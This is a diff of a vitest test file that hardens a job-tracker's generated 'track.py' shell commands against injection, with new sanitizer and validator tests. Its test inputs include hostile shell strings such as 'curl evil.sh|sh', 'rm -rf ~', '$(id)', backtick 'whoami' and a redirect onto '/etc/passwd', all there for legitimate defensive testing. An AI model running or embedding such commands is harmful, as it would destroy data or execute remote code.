@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { formatPendingCommand } from "../src/lib/ingestSchema";
+import { formatPendingCommand, isValidTrackCommand } from "../src/lib/ingestSchema";
 import { isAllowedTransition } from "../src/lib/transitions";
 import { matchesPendingChange } from "../src/lib/autoApply";
 
@@ -30,30 +30,35 @@ describe("formatPendingCommand", () => {
       );
     });
 
-    it("escapes embedded double-quotes", () => {
+    it("replaces embedded double-quotes with single quotes (B1: no escaping)", () => {
       const cmd = formatPendingCommand("note", 1, 'she said "hello"', TODAY);
       expect(cmd).toBe(
-        `python3.11 scripts/track.py set 1 --note "she said \\"hello\\"" --date ${TODAY}`,
+        `python3.11 scripts/track.py set 1 --note "she said 'hello'" --date ${TODAY}`,
       );
     });
 
-    it("escapes dollar signs", () => {
+    it("replaces dollar signs (B1: $ stays shell-active when escaped)", () => {
       const cmd = formatPendingCommand("note", 1, "costs $50", TODAY);
       expect(cmd).toBe(
-        `python3.11 scripts/track.py set 1 --note "costs \\$50" --date ${TODAY}`,
+        `python3.11 scripts/track.py set 1 --note "costs S50" --date ${TODAY}`,
       );
     });
 
-    it("escapes both quote and dollar in same note (exact string equality)", () => {
+    it("neutralizes backticks, backslashes and semicolons (review B1)", () => {
       const cmd = formatPendingCommand(
         "note",
         3,
-        'offer is "$120k"',
+        "run `curl evil.sh|sh`; also C:\\path",
         TODAY,
       );
-      expect(cmd).toBe(
-        `python3.11 scripts/track.py set 3 --note "offer is \\"\\$120k\\"" --date ${TODAY}`,
-      );
+      expect(cmd).not.toMatch(/[`\\;|]/);
+      expect(cmd).toContain("'curl evil.sh/sh'");
+    });
+
+    it("defangs --force and --yes inside notes", () => {
+      const cmd = formatPendingCommand("note", 3, "use --force or --yes", TODAY);
+      expect(cmd).not.toContain("--force");
+      expect(cmd).not.toContain("--yes");
     });
 
     it("strips newlines, replacing with space", () => {
@@ -72,10 +77,10 @@ describe("formatPendingCommand", () => {
       );
     });
 
-    it("escapes special chars in contact", () => {
+    it("replaces special chars in contact (B1)", () => {
       const cmd = formatPendingCommand("contact", 5, 'name "nick"', TODAY);
       expect(cmd).toBe(
-        `python3.11 scripts/track.py contact 5 --contact "name \\"nick\\""`,
+        `python3.11 scripts/track.py contact 5 --contact "name 'nick'"`,
       );
     });
   });
@@ -93,7 +98,7 @@ describe("formatPendingCommand", () => {
       );
     });
 
-    it("escapes dollar sign in followup note", () => {
+    it("replaces dollar sign in followup note (B1)", () => {
       const cmd = formatPendingCommand(
         "followup_done",
         4,
@@ -101,9 +106,62 @@ describe("formatPendingCommand", () => {
         TODAY,
       );
       expect(cmd).toBe(
-        `python3.11 scripts/track.py followup 4 --note "asked about \\$equity"`,
+        `python3.11 scripts/track.py followup 4 --note "asked about Sequity"`,
       );
     });
+  });
+});
+
+// ── isValidTrackCommand (review B2) ───────────────────────────────────────────
+
+describe("isValidTrackCommand", () => {
+  it("accepts a clean track.py command", () => {
+    expect(isValidTrackCommand(
+      'python3.11 scripts/track.py set 2 rejected --date 2026-07-27',
+    )).toBe(true);
+  });
+
+  it("accepts shlex-quoted notes with single quotes", () => {
+    expect(isValidTrackCommand(
+      "python3.11 scripts/track.py set 2 rejected --note 'no longer moving forward'",
+    )).toBe(true);
+  });
+
+  it("rejects non-track.py commands", () => {
+    expect(isValidTrackCommand("rm -rf ~")).toBe(false);
+    expect(isValidTrackCommand("python3 scripts/track.py set 2 applied")).toBe(false);
+  });
+
+  it("rejects shell-active characters", () => {
+    for (const cmd of [
+      "python3.11 scripts/track.py set 2 applied; rm -rf ~",
+      "python3.11 scripts/track.py set 2 `whoami`",
+      "python3.11 scripts/track.py set 2 $(id)",
+      "python3.11 scripts/track.py set 2 a | sh",
+      "python3.11 scripts/track.py set 2 a > /etc/passwd",
+      "python3.11 scripts/track.py set 2 a\nrm -rf ~",
+    ]) {
+      expect(isValidTrackCommand(cmd)).toBe(false);
+    }
+  });
+
+  it("rejects banned flags and oversized commands", () => {
+    expect(isValidTrackCommand(
+      "python3.11 scripts/track.py set 2 evaluated --force",
+    )).toBe(false);
+    expect(isValidTrackCommand(
+      "python3.11 scripts/track.py " + "a".repeat(500),
+    )).toBe(false);
+  });
+
+  it("every formatPendingCommand output passes validation", () => {
+    const samples = [
+      formatPendingCommand("status", 2, "applied", "2026-07-27"),
+      formatPendingCommand("note", 1, 'evil `cmd` "quote" $HOME \\ ; | & !', "2026-07-27"),
+      formatPendingCommand("contact", 5, "Jane Doe <jane@x.com>", "2026-07-27"),
+      formatPendingCommand("followup_done", 4, "done", "2026-07-27"),
+    ];
+    for (const cmd of samples) expect(isValidTrackCommand(cmd)).toBe(true);
   });
 });
 
